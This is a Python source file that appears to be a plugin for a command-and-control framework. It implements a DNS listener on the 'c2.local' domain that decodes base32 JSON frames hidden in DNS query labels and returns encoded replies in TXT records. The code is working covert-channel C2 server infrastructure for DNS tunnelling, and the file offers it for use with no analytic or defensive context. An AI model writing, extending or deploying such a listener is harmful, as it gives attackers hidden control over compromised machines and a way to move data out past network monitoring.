import asyncio
import base64
import json
import struct

PLUGIN = {
    "name": "DNS Listener",
    "protocol": "dns",
    "default_port": 5353,
    "supports_payload": True,
    "description": "Base32 TXT DNS transport for small encrypted frames",
}

DOMAIN = "c2.local"


def _parse_question(data):
    if len(data) < 12:
        raise ValueError("short dns")
    qid = data[:2]
    offset = 12
    labels = []
    while offset < len(data):
        length = data[offset]
        offset += 1
        if length == 0:
            break
        labels.append(data[offset:offset + length].decode("ascii", "ignore"))
        offset += length
    if offset + 4 > len(data):
        raise ValueError("missing qtype")
    qtype, qclass = struct.unpack(">HH", data[offset:offset + 4])
    return qid, labels, qtype, qclass, offset + 4


def _txt_response(qid, labels, answer_text):
    chunks = [answer_text[i:i + 180] for i in range(0, len(answer_text), 180)] or [""]
    question = b"".join(bytes([len(part)]) + part.encode("ascii", "ignore") for part in labels) + b"\x00"
    question += struct.pack(">HH", 16, 1)
    header = qid + struct.pack(">HHHHH", 0x8180, 1, len(chunks), 0, 0)
    answers = b""
    for chunk in chunks:
        raw = chunk.encode("ascii")
        answers += b"\xc0\x0c" + struct.pack(">HHIH", 16, 1, 0, len(raw) + 1) + bytes([len(raw)]) + raw
    return header + question + answers


class DnsProtocol(asyncio.DatagramProtocol):
    def __init__(self, runtime, listener):
        self.runtime = runtime
        self.listener = listener
        self.transport = None

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        try:
            qid, labels, qtype, qclass, _ = _parse_question(data)
            if not labels or labels[-2:] != ["c2", "local"]:
                return
            body_labels = labels[:-2]
            if len(body_labels) < 2:
                return
            total = int(body_labels[0])
            index = int(body_labels[1])
            encoded = "".join(body_labels[2:])
            if index != 0:
                return
            raw = base64.b32decode(encoded.upper() + "=" * (-len(encoded) % 8))
            request = json.loads(raw.decode("utf-8"))
            response = self.runtime.transport_poll(request)
            answer = base64.b32encode(json.dumps(response).encode("utf-8")).decode().rstrip("=")
            packet = _txt_response(qid, labels, answer)
            self.transport.sendto(packet, addr)
        except Exception:
            return


async def start(runtime, listener):
    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: DnsProtocol(runtime, listener),
        local_addr=(listener.get("host", "0.0.0.0"), int(listener["port"])),
    )
    listener["runtime"] = {"kind": "dns", "port": listener["port"]}
    return transport


async def stop(handle):
    if handle:
        handle.close()
